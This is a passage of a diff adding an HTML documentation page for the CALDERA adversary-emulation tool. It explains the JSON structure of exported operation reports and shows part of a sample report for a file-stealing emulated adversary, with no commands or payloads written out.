@@ -1,0 +1,1208 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Operation Results &mdash; caldera  documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+  <script type="text/javascript" src="_static/js/modernizr.min.js"></script>
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
+        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
+        <script src="_static/jquery.js"></script>
+        <script src="_static/underscore.js"></script>
+        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="_static/js/theme.js"></script>
+
+    
+
+  
+  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="Initial Access Attacks" href="Initial-Access-Attacks.html" />
+    <link rel="prev" title="Objectives" href="Objectives.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="index.html">
+          
+
+          
+            
+            <img src="_static/caldera-logo.png" class="logo" alt="Logo"/>
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption" role="heading"><span class="caption-text">Usage Guides</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="Installing-CALDERA.html">Installing CALDERA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Getting-started.html">Getting started</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Learning-the-terminology.html">Learning the terminology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Basic-Usage.html">Basic Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Server-Configuration.html">Server Configuration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Plugin-library.html">Plugin library</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Parsers.html">Parsers</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Relationships.html">Relationships</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Requirements.html">Requirements</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Objectives.html">Objectives</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Operation Results</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#operation-report">Operation Report</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#sample-operation-report">Sample Operation Report</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#operation-event-logs">Operation Event Logs</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#sample-event-logs">Sample Event Logs</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#automatic-event-log-generation">Automatic Event Log Generation</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="Initial-Access-Attacks.html">Initial Access Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Lateral-Movement-Guide.html">Windows Lateral Movement Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Dynamically-Compiled-Payloads.html">Dynamically-Compiled Payloads</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Exfiltration.html">Exfiltration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Sandcat-Peer-to-Peer.html">Peer-to-Peer Proxy Functionality for Sandcat Agents</a></li>
+<li class="toctree-l1"><a class="reference internal" href="C2-Tunneling.html">C2 Communications Tunneling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Uninstalling-CALDERA.html">Uninstall CALDERA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Troubleshooting.html">Troubleshooting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="resources.html">Resources</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Plugin Documentation</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="plugins/sandcat/Sandcat-Details.html">Sandcat Plugin Details</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html">Exfiltration Scenarios and Setup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#an-example">An Example</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#wrap-up">Wrap-up</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Developer Information</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="The-REST-API.html">The REST API</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Plugins.html">How to Build Plugins</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Planners.html">How to Build Planners</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Agents.html">How to Build Agents</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Core System API</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="_generated/modules.html">app</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="index.html">caldera</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="index.html">Docs</a> &raquo;</li>
+        
+      <li>Operation Results</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="_sources/Operation-Results.md.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="operation-results">
+<h1>Operation Results<a class="headerlink" href="#operation-results" title="Permalink to this heading">¶</a></h1>
+<p>The “Operations” tab enables users to view past operations, create new operations, and export operation reports in <code class="docutils literal notranslate"><span class="pre">JSON</span></code> or <code class="docutils literal notranslate"><span class="pre">csv</span></code> format.  When starting a new operation, the “Operations” tab UI provides information on which commands are executed, their status as recorded by the CALDERA C2 server, and the captured <code class="docutils literal notranslate"><span class="pre">stdout</span></code> and <code class="docutils literal notranslate"><span class="pre">stderr</span></code> as applicable.</p>
+<p>After completing an operation, you can explore the operations setup, progress, and execution graph using the “Debrief” plugin. Debrief also provides executive-level overviews of the operations progress and the attacks success as a <code class="docutils literal notranslate"><span class="pre">PDF</span></code> report.</p>
+<p>After an operation runs, you can export the results in two different <code class="docutils literal notranslate"><span class="pre">JSON</span></code> formats: an operation report or operation event logs.  Both are rich sources of information on the technical specifics of which commands were executed, at what time, and with what result.  The event logs report ability-level execution records, while the operation report covers a broader range of target, contact, and planning information.  The structures of each are compared in the <a class="reference internal" href="#operation-report"><span class="std std-doc">Operation Report</span></a> and <a class="reference internal" href="#operation-event-logs"><span class="std std-doc">Event Logs</span></a> sections.</p>
+<div class="section" id="operation-report">
+<h2>Operation Report<a class="headerlink" href="#operation-report" title="Permalink to this heading">¶</a></h2>
+<p>The operation report JSON consists of a single dictionary with the following keys and values:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">name</span></code>: String representing the name of the operation</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">host_group</span></code>: JSON list of dictionary objects containing information about an agent in the operation.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">start</span></code>: String representing the operation start time in YYYY-MM-DD HH:MM:SS format.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">steps</span></code>: nested JSON dict that maps agent paw strings to an inner dict which maps the string key <code class="docutils literal notranslate"><span class="pre">steps</span></code> to a list of dict objects. Each innermost dict contains information about a step that the agent took during the operation:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">link_id</span></code>: String representing the UUID of the executed link.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ability_id</span></code>: String representing the UUID of the corresponding ability for the command. (e.g. <code class="docutils literal notranslate"><span class="pre">90c2efaa-8205-480d-8bb6-61d90dbaf81b</span></code>)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">command</span></code>: String containing the base64 encoding of the command that was run.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">delegated</span></code>: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation made the link available for collection</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">run</span></code>: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the agent submitted the execution results for the command.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">status</span></code>: Int representing the status code for the command.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">platform</span></code>: String representing the operating system on which the command was run.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">executor</span></code>: String representing which agent executor was used for the command (e.g. <code class="docutils literal notranslate"><span class="pre">psh</span></code> for PowerShell).</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">pid</span></code>: Int representing the process ID for running the command.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">description</span></code>: String representing the command description, taken from the corresponding ability description.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">name</span></code>: String representing the command nae, taken from the corresponding ability name.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">attack</span></code>: JSON dict containing ATT&amp;CK-related information for the command, based on the ATT&amp;CK information provided by the corresponding ability:</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">tactic</span></code>: ATT&amp;CK tactic for the command ability.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">technique_name</span></code>: Full ATT&amp;CK technique name for the command.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">technique_id</span></code>: ATT&amp;CK technique ID for the command (e.g. <code class="docutils literal notranslate"><span class="pre">T1005</span></code>)</p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">output</span></code>: optional field. JSON dict containing the output generated when running the command. Only appears if the user selected the <code class="docutils literal notranslate"><span class="pre">include</span> <span class="pre">agent</span> <span class="pre">output</span></code> option when downloading the report.</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">stdout</span></code>: Standard output from the command that was run.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">stderr</span></code>: Standard error from the command that was run.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">exit_code</span></code>: Exit code returned from the command that was run.</p></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">finish</span></code>: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation finished.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">planner</span></code>: Name of the planner used for the operation.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">adversary</span></code>: JSON dict containing information about the adversary used in the operation</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">atomic_ordering</span></code>: List of strings that contain the ability IDs for the adversary.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">objective</span></code>: objective UUID string for the adversary.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">tags</span></code>: List of adversary tags</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">has_repeatable_abilities</span></code>: A boolean flag indicating if any ability in the adversary is repeatable.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">name</span></code>: Adversary name</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">description</span></code>: Adversary description</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">plugin</span></code>: The adversary’s source plugin (e.g. <code class="docutils literal notranslate"><span class="pre">stockpile</span></code>)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">adversary_id</span></code>: Adversary UUID string</p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">jitter</span></code>: String containing the min/max jitter values.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">objectives</span></code>: JSON dict containing information about the operation objective.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">facts</span></code>: list of dict objects, where each dict represents a fact used or collected in the operation.</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">origin_type</span></code>: String representation of the fact’s origin (e.g. <code class="docutils literal notranslate"><span class="pre">SEEDED</span></code> if seeded by the operation’s fact source or <code class="docutils literal notranslate"><span class="pre">LEARNED</span></code> if the fact was learned during execution of the operation)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">created</span></code>: String representing the fact creation time in YYYY-MM-DD HH:MM:SS format</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">name</span></code>: String representation of the fact’s name in major to minor format (e.g. <code class="docutils literal notranslate"><span class="pre">file.sensitive.extension</span></code> for a sensitive file extension)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">source</span></code>: A string representing the UUID of the fact source containing this fact</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">score</span></code>: Integer representing the fact score</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">value</span></code>: A string representing the fact’s value (e.g. a fact named <code class="docutils literal notranslate"><span class="pre">file.sensitive.extension</span></code> may have a value <code class="docutils literal notranslate"><span class="pre">yml</span></code>)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">links</span></code>: A list of string-valued link UUID which generated this fact</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">limit_count</span></code>: Integer representing the maximum number of occurrences this fact can have in the fact source, defaults to <code class="docutils literal notranslate"><span class="pre">-1</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">technique_id</span></code>: ATT&amp;CK technique ID for the command (e.g. <code class="docutils literal notranslate"><span class="pre">T1005</span></code>)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">relationships</span></code>: list of string-valued fact relationships for facts with this name and value (e.g. <code class="docutils literal notranslate"><span class="pre">host.file.path(/Users/foo/bar.yml)</span> <span class="pre">:</span> <span class="pre">has_extension</span> <span class="pre">:</span> <span class="pre">file.sensitive.extension(yml))</span></code>)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">trait</span></code>: A string representing the fact’s trait, or the information the fact seeks to store and capture (e.g. <code class="docutils literal notranslate"><span class="pre">file.sensitive.extension</span></code>)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">collected_by</span></code>: A list of string-valued agent UUIDs which collected this fact.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">unique</span></code>: A string representing the fact’s unique value (e.g. <code class="docutils literal notranslate"><span class="pre">file.sensitive.extensionyml</span></code>)</p></li>
+</ul>
+</li>
+<li><p><code class="docutils literal notranslate"><span class="pre">skipped_abilities</span></code>: list of JSON dicts that map an agent paw to a list of inner dicts, each representing a skipped ability.</p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">reason</span></code>: Indicates why the ability was skipped (e.g. <code class="docutils literal notranslate"><span class="pre">Wrong</span> <span class="pre">Platform</span></code>)</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">reason_id</span></code>: ID number for the reason why the ability was skipped.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ability_id</span></code>: UUID string for the skipped ability</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ability_name</span></code>: Name of the skipped ability.</p></li>
+</ul>
+</li>
+</ul>
+<p>To download an operation report manually, users can click the “Download Report” button under the operation drop-down list in the operation modal. To include the command output, select the <code class="docutils literal notranslate"><span class="pre">include</span> <span class="pre">agent</span> <span class="pre">output</span></code> checkbox.</p>
+<p>Below is an example operation report JSON:</p>
+<div class="section" id="sample-operation-report">
+<h3>Sample Operation Report<a class="headerlink" href="#sample-operation-report" title="Permalink to this heading">¶</a></h3>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;adversary&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;adversary_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1a98b8e6-18ce-4617-8cc5-e65a1a9d490e&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;atomic_ordering&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">      </span><span class="s2">&quot;6469befa-748a-4b9c-a96d-f191fde47d89&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;90c2efaa-8205-480d-8bb6-61d90dbaf81b&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;4e97e699-93d7-4040-b5a3-2e906a58199e&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;300157e5-f4ad-4569-b533-9d1fa0e74d74&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;ea713bc4-63f0-491c-9a6f-0b01d560b87e&quot;</span>
+<span class="w">    </span><span class="p">],</span>
+<span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;An adversary to steal sensitive files&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;has_repeatable_abilities&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Thief&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;objective&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;495a9828-cab1-44dd-a0ca-66e58177d8cc&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;plugin&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;stockpile&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;facts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;collected_by&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:07Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;limit_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;links&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;fa7ac865-004d-4296-9d68-fd425a481b5e&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extension&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;origin_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SEEDED&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;relationships&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;host.file.path(/Users/foo/bar/sensitive.sql) : has_extension : file.sensitive.extension(sql)&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">6</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;trait&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extension&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;unique&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extensionsql&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sql&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;collected_by&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:07Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;limit_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;links&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;ddf2aa96-24a1-4e71-8360-637a821b0781&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extension&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;origin_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SEEDED&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;relationships&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;host.file.path(/Users/foo/bar/credentials.yml) : has_extension : file.sensitive.extension(yml)&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">6</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;trait&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extension&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;unique&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extensionyml&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;yml&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;collected_by&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:07Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;limit_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;links&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;719378af-2f64-4902-9b51-fb506166032f&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extension&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;origin_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SEEDED&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;relationships&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;host.file.path(/Users/foo/bar/PyTorch Models/myModel.pt) : has_extension : file.sensitive.extension(pt)&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">6</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;trait&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extension&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;unique&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;file.sensitive.extensionpt&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;pt&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;collected_by&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;vrgirx&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:20Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;limit_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;links&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;d52a51ff-b7af-44a1-a2f8-2f2fa68b5c73&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.dir.staged&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;origin_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;LEARNED&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;relationships&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;host.dir.staged(/Users/foo/staged)&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;3e8c71c1-dfc8-494f-8262-1378e8620791&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1074.001&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;trait&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.dir.staged&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;unique&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.dir.staged/Users/foo/staged&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/staged&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;collected_by&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;vrgirx&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:08:56Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;limit_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;links&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;719378af-2f64-4902-9b51-fb506166032f&quot;</span>
+<span class="w">      </span><span class="p">],</span>
